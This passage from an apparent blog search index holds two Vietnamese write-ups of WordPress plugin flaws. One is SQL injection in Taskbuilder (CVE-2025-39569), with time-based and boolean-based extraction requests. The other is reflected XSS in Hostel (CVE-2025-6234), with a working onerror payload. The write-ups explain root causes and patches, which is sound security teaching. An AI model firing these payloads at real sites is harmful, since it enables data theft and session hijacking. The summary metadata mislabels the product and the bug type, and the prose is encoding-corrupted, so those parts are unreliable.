buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium (7.1)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca 